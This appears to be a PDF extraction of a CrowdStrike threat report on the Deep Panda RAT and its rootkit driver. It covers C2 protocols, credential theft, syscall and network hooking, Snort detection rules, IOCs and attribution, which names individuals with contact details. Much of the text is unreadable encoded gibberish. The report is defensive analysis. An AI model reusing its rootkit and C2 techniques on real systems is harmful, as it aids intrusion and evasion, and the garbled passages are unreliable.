WDNHV�D�WHPSODWH�VDPSOH�DQG�OHWV�DQ�XQVRSKLVWLFDWHG�XVHU�VSHFLI\�D�FRQ¿JXUDWLRQ�ZLWKRXW�UHFRPSLOLQJ�DQ\�
code.

S  E  N  S  I  T  I  V E 11CROWDSTRIKE

DEEP PANDA



,I�WKH�FXUUHQW�VHUYLFH�QDPH�PDWFKHV�D�VHW�RI�SUH�GH¿QHG�VHUYLFH�QDPHV�WKDW�OHJLWLPDWHO\�H[LVW�LQ�:LQGRZV��
the backdoor then loads the original service’s DLL into the address space with LoadLibrary and invokes the 
ServiceMain export. This effectively hijacks the original service’s entry while retaining its functionality.

While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default 
FRQ¿JXUDWLRQ�SUHVHQW�VSHFL¿HV�����������������DV�D�&��WR�XVH��WKLV�LV�WKH�VDPH�+RQJ�.RQJ�&��VHUYHU�DV�
the one used by the post exploitation .NET tool. 

The malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one 
can be bundled in two different ‘dual’ modes (see 3.), totaling 7 distinct supported C2 mechanisms. The con-
¿JXUDWLRQ�FRQWDLQV�WKH�&��SURWRFRO�WR�EH�XVHG�RU�RSWLRQDOO\�D�VHOI�FRQ¿JXUDWLRQ�PRGH�LQ�ZKLFK�WKH�PDOZDUH�
DWWHPSWV�WKH�GLIIHUHQW�&��SURWRFROV�LQ�D�SUH�GH¿QHG�RUGHU��,Q�VHOI�FRQ¿JXUDWLRQ��D�FRQQHFWLRQ�YLD�D�SUR[\�LV�
DWWHPSWHG�LI�WKH�V\VWHP�ZLGH�,QWHUQHW�([SORUHU�VHWWLQJV�VSHFLI\�VXFK�D�SUR[\��7KH�FRQ¿JXUDWLRQ�IRXQG�LQ�WKLV�
VDPSOH�LV�VHW�WR�DXWRPDWLF�VHOI�FRQ¿JXUDWLRQ��UHVXOWLQJ�LQ�WKH�IROORZLQJ�PHFKDQLVPV�EHLQJ�WULHG�LQ�WKLV�RUGHU�

1.  Proprietary binary header (optionally over an HTTP Proxy using CONNECT mechanism); this 
     protocol consists of 64 random bytes being sent to the C2. The C2 then responds with 64 bytes
�����ZKHUH�WKH�¿UVW�IRXU�E\WHV�PXVW�PDWFK�WKH�¿UVW�IRXU�VHQW�E\WHV�WR�HVWDEOLVK�D�FRQQHFWLRQ�
�����VXFFHVVIXOO\��7KH�UHPDLQLQJ�E\WHV�DUH�GLVFDUGHG��,QWHUHVWLQJO\��WKH�PDOZDUH�VWRUHV�WKH�¿UVW�IRXU
     bytes rotated right by seven bits and compares that value to the seven bits rotated right version of
     the server’s response, effectively neutralizing the rotation’s effect; the purpose of this is unclear.
����$�ORQJ�UXQQLQJ�+773�3267�UHTXHVW�WR�WKH�SDWK�³�IRUXP�ORJLQ�FJL´�ZLWK�D�VWDWLFDOO\�GH¿QHG�+773
     request string including HTTP headers (optionally over a HTTP Proxy using CONNECT). The
     malware requires the response to start with “HTTP/1.0 200” or “HTTP/1.1 200” and an absence of
     a “Connection: close” header. This one HTTP connection will be used for bi-directional 
     communications, sending chunks of POST payload and receiving chunks of the response, 
     interleaved.
3.  Two long-running HTTP requests to the same C2 (optionally over an HTTP Proxy with original 
     request verb), one GET request to “/Photos/Query.cgi?loginid=” followed by a random number
     and one POST request to “/Catelog/login1.cgi”. The GET request serves as a down-stream 
     channel while the POST request serves as a upstream channel.

7KLV�GHPRQVWUDWHV�DQ�DWWHPSW�WR�XVH�WKH�PRVW�HI¿FLHQW�FRPPXQLFDWLRQ�FKDQQHO�¿UVW��IDOOLQJ�EDFN�WR�PRUH�
legitimate appearing channels as required in order to appear Request For Comment (RFC) compliant with 
the HTTP protocol.

$GGLWLRQDOO\��WKH�PDOZDUH�FRQWDLQV�D�FXVWRP�'16�FOLHQW�LPSOHPHQWDWLRQ�WKDW�ZLOO�XVH�WKH�V\VWHP¶V�FRQ¿JXUHG�
'16�VHUYHU�WR�WXQQHO�&��WUDI¿F�RYHU�OHJLWLPDWH�'16��6LQFH�WKLV�&��

S  E  N  S  I  T  I  V E 12CROWDSTRIKE

C2 Communication Mechanisms

DEEP PANDA



PHFKDQLVP�LV�QRW�DWWHPSWHG�LQ�VHOI�FRQ¿JXUDWLRQ�DQG�ZDV�QRW�FRQ¿JXUHG�IRU�WKLV�ELQDU\��DQDO\VLV�ZDV�OHIW�RXW�
due to time constraints.

After establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will 
start sending and receiving compressed binary blobs via the channel of choice. The C2’s binary data blobs 
are compressed. No further encryption of the data takes place.

All C2 transport implementations contain code for accepting and handling server-side connections of the 
respective protocols. However, this code does not appear to be invoked. It appears that the author of this 
code shares the library that implements these transports for the client with the C2 server.

The main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any 
of the following registered handler classes based upon a command ID. The handler class is responsible for 
parsing the remainder of the command.

3&&B),/(��)LOH�%URZVLQJ�DQG�'DWD�([¿OWUDWLRQ
7KLV�KDQGOHU�FODVV�IRU�FRPPDQG�,'���LPSOHPHQWV�JHQHULF�GLUHFWRU\�DQG�¿OH�EURZVLQJ�XVLQJ�)LQG)LUVW)LOH:���
DQG�)LQG1H[W)LOH:���$3,V��DV�ZHOO�DV�UHDGLQJ�DQG�ZULWLQJ�DUELWUDU\�¿OHV�YLD�&��FRPPDQGV��WKXV�HQDEOLQJ�
XSORDG�DQG�GRZQORDG�RI�DUELWUDU\�¿OHV��7KLV�LV�W\SLFDOO\�VHHQ�LQ�5$7V�IRU�VHDUFKLQJ�VSHFL¿F�¿OHV�WR�H[¿OWUDWH���
$GGLWLRQDOO\��WKLV�FODVV�LPSOHPHQWV�ODXQFKLQJ�RI�VSHFL¿HG�H[HFXWDEOH�¿OHV�YLD�WKH�&UHDWH3URFHVV���$3,�

PCC_PROXY: TCP Proxy
This handler class implements a generic TCP proxy. It supports establishing TCP connections to other hosts 
and also listening for incoming connections. The incoming connection contents are forwarded to the C2 and 
data from the C2 is passed on to connections. It supports up to 1024 parallel connections. 

PCC_MISC : Gather and report system information
The malware is capable of gathering various pieces of information from the system, triggered by a command 
ID 10. The capabilities include recovering authentication credentials from various system and client storage 
such as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS).  This class also supports 
gathering intelligence on the infected system including identifying security tools by their process name, proxy 
accounts, and version numbers for the Operating System (OS) and Internet Explorer.  

PCC_SYS: System Management
This handler class provides the attacker with the ability to manage system components including start/stop/
delete system services, enumerate/alter registry keys, and manage running processes.  This class also 
provides the ability for the attacker to take a screen shot of the users desktop.

INTERNAL_CMD: Command-Line Shell

S  E  N  S  I  T  I  V E 13CROWDSTRIKE

C2 Command Invocation

DEEP PANDA



This handler class uses the command ID 5 and implements an interactive command line shell accessible 
from the C2 server, containing a series of built-in commands. If the input is not in this list of built-in 
commands, the malware attempts to invoke cmd.exe in the background, launching a command or command 
line utility already present on the system. The standard output channel of that command is provided back to 
the C2. The supported built-in commands are:

Ɣ� ��KHOS�_�"����VKRZV�D�OLVW�RI�EXLOW�LQ�FRPPDQGV�
Ɣ� ��FG
Ɣ� ��GLU
Ɣ� ��PG
Ɣ� ��UG
Ɣ� ��GHO
Ɣ� ��FRS\
Ɣ� ��UHQ
Ɣ� ��W\SH
Ɣ� ��UXQDV
Ɣ� ��SLG
Ɣ� ��FPG
Ɣ� ��VWDUW
Ɣ� ��UHERRW�>�I@
Ɣ� ��VKXWGRZQ�>�I@
Ɣ� ��FOHDUORJ�>V\VWHP@�>DSSOLFDWLRQ@�>VHFXULW\@
Ɣ� ��ZJHW
Ɣ� ��KWWSXUO

Kill Switch / Self-Destruction
The only command that is implemented directly in the main backdoor thread as a subprocedure call and not 
via a generic command handler class is command ID 256. This command results in the DLL deleting itself 
and terminating the backdoor process.

This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of: 
de7500fc1065a081180841f32f06a537, this sample will only function on a Windows 32-bit kernel. This code 
appears to have been compiled on Sunday October 9, 2011 at 4:50:31 P.M.  UTC (very early morning time 
of Monday, October 10 in China).

This section describes how the driver performs its initialization routine.

Multiple Instance Protection
The driver begins by opening a named event in the BaseNamedObjects object directory with the name 
^�&%�II���������FI��%'�)�(���%&����'&`�XVLQJ�WKH�:LQGRZV�$3,�=Z2SHQ(YHQW����,I�WKH�HYHQW�DOUHDG\�
exists, the driver fails to load, presumably to avoid a

S  E  N  S  I  T  I  V E 14CROWDSTRIKE

Kernel Driver Sample (MD5: dae6b9b3b8e39b08b10a51a6457444d8)

Entrypoint

DEEP PANDA



multiple instances of itself. If the event does not exist, the driver then creates it using the Windows API 
=Z&UHDWH(YHQW����7KH��:LQGRZV�$3,�IRU�FUHDWLQJ�HYHQWV��=Z&UHDWH(YHQW����RU�&UHDWH(YHQW���LQ�XVHU�PRGH��
DOUHDG\�SURYLGHV�WKH�DELOLW\�WR�³FUHDWH�RU�RSHQ´�DQ�HYHQW��VR�WKH�XVH�RI�DQ�LQLWLDO�=Z2SHQ(YHQW�LV�VXSHUÀXRXV�
and indicative of relatively limited Windows API knowledge of the author of that part of the code.  It is 
interesting to note that some of the hex digits in the object name are mixed case which is potentially 
indicative of the code being re-appropriated from another source.

The second component of the entry point performs an anti-debugging technique, calling the function 
KdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging 
facility that is used by popular kernel debuggers KD and WinDbg.  Tools such as Syser Debugger, or 
debugging through a virtual machine are unaffected by this technique. The sample, rather than importing the 
KdDisableDebugger() API using conventional methods, looks up the API through 
MmGetSystemRoutineAddress() instead. All of the other APIs used by the driver are imported normally, so 
this is not a technique to hide import APIs used throughout the driver. Searching Google for 
“MmGetSystemRoutineAddress” and “KdDisableDebugger” results in dozens of Chinese language blogs 
which explain how to use this technique to “Disable WinDbg”. 

7KH�¿QDO�VWHS�RI�WKH�HQWU\�SRLQW�LV�WR�EHJLQ�KRRNLQJ�WKH�V\VWHP��ZKLFK�LV�GRQH�E\�WZR�KHOSHU�IXQFWLRQV�±�RQH�
is designed to hook the system call table, while the other hooks the network stack.

Network Stack Hooking
7KH�QHWZRUN�VWDFN�KRRNLQJ�¿UVW�TXHULHV�WKH�26�YHUVLRQ�XVLQJ�5WO*HW9HUVLRQ���RU�3V*HW9HUVLRQ����&KHFNLQJ�
the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP/IP net-
work stack, most hooking operations will require a different implementation for these versions. On versions 
prior to Windows Vista, the TCP/IP driver creates a \Device\Tcp device object through which most network 
requests are piped through. On Vista and later, TCP/IP has been split up into multiple components, and IP 
connection enumeration, which this driver is targeting, is managed by \Device\nsiproxy instead.

In either case, the driver obtains the device object by using IoGetDeviceObjectPointer() and hooks Major 
Function 14 the IRP_MJ_DEVICE_CONTROL, as this is the function through which all Input Output 
ConTroLls (IOCTLs) are sent, such as the IOCTL for querying active IP connections.

Network Store Interface (NSI) Hook
The NSI hook, targets IOCTL 0x12001B, which is used by NsiGetObjectAllParameters() in nsi.dll when 
users typically run commands such as netstat.exe or use any of the IP Helper APIs in iphlpapi.dll. The 
purpose of the hook is to scan the list of active connections returned to the user, and hide any such 
connection currently bound to a local TCP port in 

S  E  N  S  I  T  I  V E 15CROWDSTRIKE

Anti-Debugging Protection

Hooking

DEEP PANDA



the range between 40000 and 45000.  The hooking is performed by creating a new completion routine 
associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL, attaching to the target 
process, performing several memory copies to hide the entry, and detaching.

This functionality is nearly identical to the code posted by Edward Sun (aka cardmagic, sunmy1@sina.com, 
onlyonejazz@hotmail.com,  cardcian@mail.ustc.edu.cn, QQ# 28025945) from Hefei, Anhui province 
(Nanjing Military District) on July 8, 2007, then a China-based researcher at Trend Micro (now working at 
.LQJVRIW�&KLQHVH�$9�FRPSDQ\��/LQNHG,Q�SUR¿OH�SDJH��KWWS���ZZZ�OLQNHGLQ�FRP�SUR¿OH�YLHZ"LG ����������at 
http://forum.eviloctal.com/viewthread.php?action=printable&tid=29604 (See Appendix G).  CrowdStrike has 
no information connecting Mr. Sun to this intrusion activity, his code appears to have been appropriated by 
the actor to add similar functionality to their code.

TCP Hook
The TCP hook works almost identically to the NSI hook, though instead hooking IOCTL 0x120003 (IOCTL_
7&3B48(5<B,1)250$7,21B(;���7KLV�,2&7/�KDV�WKH�H[DFW�VDPH�IXQFWLRQDOLW\�DV�WKH�16,�VSHFL¿F�,2&7/���
7KLV�,2&7/�ZDV�WKH�PHFKDQLVP�XVHG�RQ�:LQGRZV�YHUVLRQV�SULRU�WR�:LQGRZV�9LVWD��7KLV�KRRN�DOVR�¿OWHUV�
any connections listening on TCP ports in the range between 40000 and 45000.

System Call Hooking
7KH�V\VWHP�FDOO�KRRNLQJ�WDUJHWV�WKUHH�IXQFWLRQV���=Z6DYH.H\����=Z4XHU\9DOXH.H\����DQG�
=Z(QXPHUDWH9DOXH.H\����7KH�XQSDFNHG�NHUQHO�GULYHU�VDPSOH�KRRNV�WKHVH�IXQFWLRQV�E\�UHDGLQJ�WKH�VHFRQG�
DWORD at each of these exported functions. Because the system call stub uses the EAX register as an 
index for the system call ID, and a “mov eax, imm32”  instruction” instruction is used, this second DWORD 
will match the system call ID. It then adds this index to the value of KeServiceDescriptorTable.Base, which 
is the exported kernel variable (on 32-bit Windows only) which directly points to the system call table. This is 
one of the simplest ways to do a system call hook, but will not work on 64-bit Windows as this variable is not 
exported in addition to the protection provided by Microsoft PatchGuard.

7KH�V\VWHP�FDOO�KRRN�LV�WKHQ�SHUIRUPHG�E\�¿UVW�DOORFDWLQJ�D�0HPRU\�'HVFULSWRU�/LVW��0'/��XVLQJ�WKH�
Windows API IoAllocateMdl(), and associating the MDL to a non-paged buffer using 
MmBuildMdlForNonPagedPool().  Once the MDL is associated to the non-paged buffer, the sample locks the 
underlying pages using the Windows API MmProbeAndLockPages(). Instead of hooking the entry in the 
table directly, which is easily detectable, the driver uses the LDASM open-source disassembly engine to 
analyze the function that is being pointed to by the table, and applying a Detours-style hook directly in the 
code. It uses the standard “mov cr0, eax” technique, turning off the Write Protect (WP) bit as it does this. 
When the hook is installed, it writes a special DWORD value, ‘KDTR’, which allows it to prevent 
double-hooking or badly-hooking the system call, during unhooking, this value is also checked.

Registry Hooks
,Q�WKH�=Z6DYH.H\���KRRN��DFFHVV�WR�\\REGISTRY\\MACHINE\\SYSTEM is blocked. RegSaveKey() which is 
WKH�XVHU�PRGH�LPSOHPHQWDWLRQ�RI�WKH�NHUQHO�=Z6DYH.H\���$3,��LV�W\SLFDOO\�XVHG�ZKHQ�SHUIRUPLQJ�DQ�RIÀLQH�
backup of a particular registry key. 

S  E  N  S  I  T  I  V E 16CROWDSTRIKE

DEEP PANDA



KRRN�LV�WKH�=Z4XHU\9DOXH.H\���KRRN��ZKLFK�ORRNV�IRU�³3DUDPHWHUV´�NH\�RI�D�VHUYLFH�ZLWKLQ�WKH�UHJLVWU\�DW�
\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\. It then checks for the values of the 
“ServiceDll” and “Security” keys, in the latter case it applies an XOR on the data with the value 127. The 
user-mode component of this malware is a service called “msupdate”, this driver is attempting to hide the 
VHUYLFH��7KH�XVHU�PRGH�VHUYLFH�VWRUHV�FRQ¿JXUDWLRQ�GDWD�LQ�WKH�³6HFXULW\´�VXENH\�RI�WKH�53&�UHJLVWU\�NH\��
WKLV�FRPSRQHQW�ZLOO�REIXVFDWH�WKH�XVHU�PRGH�FRQ¿JXUDWLRQ�GDWD��7KH�GULYHU�GRHV�QRW�PDNH�DQ\�HIIRUWV�WR�
KLGH�LWV�RZQ�NH\��QRU�GRHV�LW�VSHFL¿FDOO\�FKHFN�IRU�³53&´�EHIRUH�³6HFXULW\´��ZKLFK�FDQ�OHDG�WR�UDQGRP�GDWD�
EHLQJ�REIXVFDWHG��7KH�¿QDO�KRRN��=Z(QXPHUDWH9DOXH.H\����LV�VLPLODU�LQ�VWUXFWXUH�WR�WKH�=Z4XHU\9DOXH+RRN�
key, due to the fact that these APIs provide almost identical functionality when it comes to reading registry 
values.

In the registry hooking code of the driver, a call is made to ObReferenceObjectByHandle().  This allows the 
driver to receive the ‘CM_KEY_OBJECT’ which is then used with ObQueryNameString() to get the key/value 
path. However, no call to ObDereferenceObject() is ever made, which means that all registry objects being 
sent to these APIs are eventually leaked.

In the registry hook, it was noticed that “CurrentControlSet001” was used as the target, if the target machine 
ZDV�XVLQJ�D�³ODVW�NQRZQ�JRRG´�FRQ¿JXUDWLRQ��RU�D�URDPLQJ�KDUGZDUH�SUR¿OH��WKH�UHJLVWU\�KRRN�ZRXOG�QRW�
function as intended. This is the reason the Microsoft implemented a symbolic link to \\CurrentControlSet 
ZKLFK�HQVXUHV�WKDW�UHJDUGOHVV�RI�WKH�PDFKLQHV�FRQ¿JXUDWLRQ�DQ\�UHTXHVW�ZLOO�DFFHVV�WKH�FRUUHFW�UHJLVWU\�NH\��

S  E  N  S  I  T  I  V E 17CROWDSTRIKE

DEEP PANDA





7KLV�WKUHDW�DFWRU�OHDYHV�VHYHUDO�NH\�¿QJHUSULQWV�ZKLFK�FDQ�EH�XVHG�WR�LGHQWLI\�FRPSURPLVHG�V\VWHPV���
7KHVH�GLJLWDO�¿QJHUSULQWV�DUH�XQLTXH�WR�WKLV�DGYHUVDU\�IRU�WKLV�FDPSDLJQ�

The following network signatures are designed for the popular Open Source IDS called Snort.  
These signature can be ported to other formats upon request.

Malware #1

MITIGATION / REMEDIATION

Network Signatures

Malware #2

Malware #3

S  E  N  S  I  T  I  V E 18CROWDSTRIKE

alert tcp any any <> any any (msg: “BackDoor Beacon Attempt”; content:”|78 7c 

71 4c 4a 49 49 49 4A 4C 46|”; classtype:backdoor; sid:123456; rev:27122011;)

alert tcp any any <> any any (msg: “BackDoor Beacon Attempt”; content:”Goo-

gle”; http_uri; classtype:backdoor; sid:123457; rev:27122011;)

alert ip 1.9.5.38 any <> any any (msg: “Malicious Host Detected”; class-

type:backdoor; sid:123460; rev:27122011;)

alert tcp any any <> any any (msg:”BackDoor Beacon Attempt”; content:”|03 01 

74 80 82 21 b5 64 c2 74 22 e3 02 00 00 00 49 03 00 00 00 00 00 00 00 00 00 00 

0000 00 00|”; classtype:backdoor; sid:123458; rev:27122011;)

alert ip 202.86.190.3 any <> any any (msg:”Malicious Host Detected”; class-

type:backdoor; sid:123459; rev:27122011;)

alert tcp any any <> any any (msg: “BackDoor C2”; content: “POST /forum/

login.cgi HTTP/1.1”; content:”User-Agent: Mozilla/4.0”; classtype:backdoor; 

sid:123461; rev:27122011;)

alert tcp any any <> any any (msg: “BackDoor C2”; content: “GET /Photos/Query.

cgi?loginid=”; classtype:backdoor; sid:123462; rev:27122011;)

alert tcp any any <> any any (msg: “BackDoor C2”; content: “POST /Catelog/

login1.cgi HTTP/1.1”; content:”User-Agent: Mozilla/4.0”; classtype:backdoor; 

sid:123461; rev:27122011;)

DEEP PANDA



7KH�IROORZLQJ�¿OH�V\VWHP�DUWLIDFWV�DUH�LQGLFDWLYH�RI�D�FRPSURPLVHG�KRVW�

Dropper/DLL
C:\Documents and Settings\All Users\Documents\infoadmn.dll (TS: 2007-03-07 00:00:00)
C:\Documents and Settings\All Users\Documents\infoctrs.dll (TS: 2007-03-07 00:00:00)
C:\Documents and Settings\All Users\Documents\infocardapi.dll (TS: 2007-03-07 00:00:00)
MD5: 47619fca20895abc83807321cbb80a3d

Post Explotiation Tool
MD5: 2dce7fc3f52a692d8a84a0c182519133

Backdoor
MD5: de7500fc1065a081180841f32f06a537

Kernel Driver:
MD5: dae6b9b3b8e39b08b10a51a6457444d8
“%sysdir%\Drivers\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys”

The following Windows Registry artifacts are indicative of a compromised host:

Dropper/DLL 
HKLM\\SYSTEM\\CurrentControlSet\\Services\\msupdate
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost which will have 
the ‘msupdate’ key set to ‘msupdate’

Backdoor
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Msres<3 character rand>.ttf

Dropper/DLL
Username: _DomainUser_ Password:”Dom4!nUserP4ss”

Backdoor
The backdoor may be detected by several different Anti-Virus products under a signature with the name: 
Derusbi

Kernel Driver
Object: {8CB2ff21-0166-4cf1-BD8F-E190BC7902DC}

File System Artifacts

Registry Artifacts

Other Artifacts

S  E  N  S  I  T  I  V E 19CROWDSTRIKE

DEEP PANDA





Attribution in the cyber domain is always a tricky subject when relying solely on malicious samples. 
Compiler artifacts and language settings can of course be deliberately masked or spoofed.  CrowdStrike 
uses a unique approach of comprehensive threat analysis in order to decipher attributable components.  
Based on the corroborating evidence discovered in the course of this analysis, it appears there are 
numerous indications that this is a Chinese-speaking actor.  

=KX'RQJ)DQJ<X�H[H�LV�D�FRPSRQHQW�RI�������� , a Chinese security product available from 
http://www.360.cn/. This is particularly relevant in this case because the backdoor DLL sample with an MD5 
RI�GH����IF����D���������I��I��D����VSHFL¿FDOO\�DYRLGV�LQVWDOOLQJ�WKH�NHUQHO�GULYHU�RQ�D�V\VWHP�UXQQLQJ�
this tool.  Speculatively this may be because this security product detects this rootkit, or the author was 
attempting to prevent accidental infection on systems running this Anti-Virus product.

The obfuscation of the KdDisableDebugger() function call is seen on several  Chinese language forums, 
and can be seen being reused in several code samples on those forums.  As previously mentioned there is 
no advantage associated with using this call obfuscation, and appears to be reused for no apparent reason 
other than the attackers have copied code directly from forum code.

While the various network hooking techniques used in the kernel driver may appear novel or well 
UHVHDUFKHG��XSRQ�FORVH�LQVSHFWLRQ�LW�LV�DFWXDOO\�D�OLQH�IRU�OLQH�FRS\�RI�DQ�H[LVWLQJ�SRVW�IURP�WKH�QRZ�RIÀLQH�
‘rootkit.com’ by a Chinese language developer. This post is currently mirrored on dozens of Chinese hacking 
websites.

Similarly the system call hooking is less impressive after searching for “IoAllocateMdl” and “cr0” (bbs.pediy.
com/showthread.php?t=77467��ZKLFK�LGHQWL¿HV�&KLQHVH�IRUXP�ZHEVLWHV�ZLWK�DOPRVW�LGHQWLFDO�FRGH�WR�
perform system call hooking through MDLs. The ldasm inline hooking is also repeated in numerous postings 
to Chinese forums. One particular website (http://read.pudn.com/downloads197/sourcecode/windows/sys-
tem/927802/CCRootkit/RootkitSys/HookSSDT.c__.htm) had an almost identical ldasm loop that tried to 
identify the exact same code sequences.  Open source research of the 4 innocuous kernel APIs 
³=Z6DYH.H\�=Z4XHU\9DOXH.H\�=Z(QXPHUDWH9DOXH.H\�,R$OORFDWH0GO´��LQ�FRQFHUW�OHDGV�GLUHFWO\�WR�D�
Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs. 

While the driver does not use pool tags for most of its allocations, it does utilize them in the networking 
hooking code, much like the examples found on the Chinese language forums. This sample uses pool tags: 
‘tnet,’ and ‘KDTR’. Although the meaning of the KDTR tag is not 

ATTRIBUTION

S  E  N  S  I  T  I  V E 20CROWDSTRIKE

1 http://bbs.pediy.com/showthread.php?t=125358
   http://kost0911.pixnet.net/blog/post/36914183-anti-anti-windbg

DEEP PANDA



REYLRXV��ZH�DVVHVV�ZLWK�KLJK�FRQ¿GHQFH�WKDW�WKLV�LV�D�VKRUWHQHG�YHUVLRQ�RI��³.HUQHO�'H7RX5´��ZKLFK�
coincides with the matching functionality of the detour-style inline hook.

The driver code (MD5: dae6b9b3b8e39b08b10a51a6457444d8) appears to be a combination of various 
code that is easily searchable on the Internet, and almost always attributed to Chinese language forums 
and websites. The system call hooking parts of the code appear to be identical to the HookSSDT.c code 
authored by Steven Lai ‘embedlinux’ and utilized in what the author titled ‘CC Rootkit’ on on August 4, 2008 
who’s email address is hqulyc@126.com.  This user has a QQ identity of: 5054-3533, QQ is a popular 
LQVWDQW�PHVVDJLQJ�FKDW�FOLHQW�XVHG�DOPRVW�H[FOXVLYHO\�LQ�&KLQD��+LV�UHDO�QDPH�DFFRUGLQJ�WR�KLV�44�SUR¿OH�
(http://user.qzone.qq.com/50543533) appears to be Steven Lai. He was is 28 years old (born September 5, 
������DQG�OLYHV�LQ�;LDPHQ��)XMLDQ�SURYLQFH��1DQMLQJ�0LOLWDU\�5HJLRQ���$FFRUGLQJ�WR�KLV�SUR¿OH��KH�KDV�ZRUNHG�
at Xiamen XOCECO New Technic Co., Ltd. (http://www.likego.com/en/about.asp), a company that builds 
DXGLR�YLGHR�V\VWHPV�IRU�WUDQVSRUWDWLRQ�V\VWHPV���0U��/DL�LV�QRW�EHLQJ�LGHQWL¿HG�DV�WKH�DFWRU��KLV�FRGH�
however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are 
providing the background on this individual.

S  E  N  S  I  T  I  V E 21CROWDSTRIKE

DEEP PANDA



S  E  N  S  I  T  I  V E 22CROWDSTRIKE

)LJXUH���3LFWXUH�WDNHQ�IURP�6WHYHQ�/DL¶V�44�3UR¿OH�3DJH

DEEP PANDA

For more information about Intelligence-as-a-Service or 
specific attribution information on Deep Panda, contact 
the CrowdStrike Global Intelligence Team

ATTRIBUTION



S  E  N  S  I  T  I  V E 23CROWDSTRIKE

)LJXUH���3LFWXUH�WDNHQ�IURP�6WHYHQ�/DL¶V�44�3UR¿OH�3DJH

DEEP PANDA

For more information about Intelligence-as-a-Service or 
specific attribution information on Deep Panda, contact 
the CrowdStrike Global Intelligence Team

ATTRIBUTION



S  E  N  S  I  T  I  V ECROWDSTRIKE

)LJXUH���3LFWXUH�WDNHQ�IURP�6WHYHQ�/DL¶V�44�SUR¿OH�SDJH

3DUWV�RI�&&5RRWNLW�SDFNDJH�DSSHDU�WR�KDYH�EHHQ�PRGL¿HG�RU�FRPSOHWHO\�UHXVHG�LQ�WKLV�VDPSOH�

(http://read.pudn.com/downloads197/sourcecode/windows/system/927802/CCRootkit/RootkitSys/HookSS-
DT.c__.htm). 

According to this Linux driver development guide ‘embedlinux’ published on July 31, 2008 (http://wenku.
baidu.com/view/e24205294b73f242336c5f45.html), t

24

DEEP PANDA

For more information about Intelligence-as-a-Service or 
specific attribution information on Deep Panda, contact 
the CrowdStrike Global Intelligence Team

ATTRIBUTION





The samples involved in this incident are typical of attacks commonly associated with the People’s 
Republic of China (PRC).  These code samples have a variety of Tools, Techniques, and Procedures (TTPs) 
WKDW�DUH�XVHG�WR�WUDFN�DQG�LGHQWLI\�VSHFL¿F�DGYHUVDU\�JURXSV���7KH�VRSKLVWLFDWLRQ�RI�WKH�DFWRU�UHVSRQVLEOH�IRU�
WKLV�LQFLGHQW�LV�GLI¿FXOW�WR�TXDQWLI\�ZLWKRXW�YLVLELOLW\�LQWR�WKH�DFWLYLWLHV�WKDW�WUDQVSLUHG�RQ�WKH�YLFWLPV�QHWZRUN���
The ability to conduct Incident Response (IR) including forensics, and log analysis, greatly augments this 
visibility into these aspects of the incident.  Some indications as to the adversaries’ capabilities can be 
derived from the captured samples alone.

The dropper code (MD5: 14c04f88dc97aef3e9b516ef208a2bf5) does not utilize any techniques that are 
unique or unusual, and is consistent with tools, techniques, and procedures of attacks targeting proprietary 
information and generally attributed to the PRC. The presence of dead code and its replacement by a more 
VLPSOH�REIXVFDWLRQ�PHWKRG�WR�KLGH�WKH�WR�EH�GURSSHG�GOO�ELQDU\�¿OH�LQGLFDWHV�FRGH�UHXVH�RQ�WKH�DWWDFNHU�
side.  The ‘dead code’ utilizes a more sophisticated compression algorithm provided by a third party which 
was rendered useless for some reason.  This may have been a result of the attacker modifying an existing 
tool, or unknowingly using a re-purposed tool.  The dropper resources indicate the compiler used to build the 
tool was running on a system that utilized the Chinese “Simple” language pack and was built on Wednesday 
May 4th, 2011 at 11:04:24 A.M. UTC (early evening time in China).  While this can be deliberately spoofed 
DV�D�µIDOVH�ÀDJ¶�RWKHU�LQGLFDWRUV�LQFOXGLQJ�WKH�&��DUH�FRQVLVWHQW�ZLWK�WKLV�KDYLQJ�EHHQ�WKH�ZRUN�RI�D�&KLQHVH�
speaking actor.  

The dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical 
RI�D�5HPRWH�$FFHVV�7RRO��5$7��ZKLFK�DUH�FRPPRQO\�XVHG�E\�35&�EDVHG�DFWRUV�LQ�GDWD�H[¿OWUDWLRQ�DWWDFNV���
7KH�FRGH�TXDOLW\�LV�QRW�LPSUHVVLYH��DQG�FRQWDLQV�D�WULYLDO�VWDFN�EXIIHU�RYHUÀRZ�YXOQHUDELOLW\���'HVSLWH�WKH�EXI-
IHU�RYHUÀRZ��WKH�&��FKDQQHO�ODFNV�DQ\�FRPPDQG�DXWKHQWLFDWLRQ�RU�HQFU\SWLRQ��DSDUW�IURP�WKH�LQLWLDO�EHDFRQ�
encryption/obfuscation using a statically compiled XOR key.  The sample uses TCP port 443 for commu-
nication, but makes no attempt to mimic the SSL protocol typically used on that port number, which would 
provide enhanced Operational Security (OPSEC).  This code appears to have been compiled on Wednes-
day May 4th, 2011 at 10:48:19 A.M. UTC (early evening time in China).

The post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be 
dropped and executed by a client-side exploit, or the adversary can launch it using a variety of command 
line options.  This tool is built in Microsoft .NET framework, which is typically an indication of a less sophis-
ticated attacker, because .NET is easier to develop in but requires the .NET framework be present on the 
victim machine.  The tool appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M. 
UTC (early evening time in China).  The sample utilizes the AES cryptographic algorithm to protect its C2 
communications.

CONCLUSION

S  E  N  S  I  T  I  V E 25CROWDSTRIKE

Dropper/Implant #1

Post Exploitation Tool

DEEP PANDA



S  E  N  S  I  T  I  V E 26CROWDSTRIKE

This DLL is a moderately sophisticated backdoor with several well designed communication mechanisms 
not typically seen in these types of implants.  The code base for the sample was developed in C++.  The 
